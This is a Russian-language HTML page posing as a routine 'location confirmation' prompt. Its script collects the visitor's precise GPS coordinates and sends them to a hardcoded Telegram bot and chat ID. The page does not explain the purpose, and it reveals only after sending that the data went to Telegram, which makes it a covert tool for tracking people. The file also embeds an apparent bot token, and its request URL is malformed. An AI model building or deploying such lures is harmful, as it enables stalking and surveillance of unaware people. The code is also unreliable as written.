<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение геопозиции</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
        button { background-color: #0088cc; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: background 0.2s; }
        button:hover { background-color: #0077b3; }
        #status { margin-top: 15px; color: #666; font-size: 14px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Доступ к локации</h2>
    <p>Для продолжения работы, пожалуйста, предоставьте доступ к вашей геопозиции.</p>
    <button onclick="getLocation()">Разрешить доступ</button>
    <div id="status"></div>
</div>

<script>
    // ВСТАВЬТЕ СЮДА ВАШ ЧАТ ID (можно узнать у бота @userinfobot или @myidbot)
const CHAT_ID = '8265354882'; 
const BOT_TOKEN = '8823625497:AAF9xB3T4d5Gde-Y_P8C_sNEO83UTyZKijQ';

    function getLocation() {
        const status = document.getElementById('status');
        if (!navigator.geolocation) {
            status.innerHTML = "Геолокация не поддерживается вашим браузером.";
            return;
        }

        status.innerHTML = "Запрос геопозиции...";

        navigator.geolocation.getCurrentPosition(
            // Если пользователь разрешил доступ:
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                status.innerHTML = "Координаты получены. Отправка...";

                // Отправляем настоящую интерактивную точку на карту в Telegram
                const url = `https://telegram.org{BOT_TOKEN}/sendLocation`;
                
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lon
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if(data.ok) {
                        status.innerHTML = "<span style='color: green;'>Успешно отправлено в Telegram!</span>";
                    } else {
                        status.innerHTML = "<span style='color: red;'>Ошибка отправки. Проверьте CHAT_ID.</span>";
                    }
                })
                .catch(error => {
                    status.innerHTML = "Ошибка сети при отправке.";
                });
            },
            // Если пользователь отклонил запрос:
            (error) => {
                status.innerHTML = "<span style='color: red;'>Доступ к геопозиции отклонен.</span>";
            },
            // Высокая точность
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
</script>

</body>
</html>
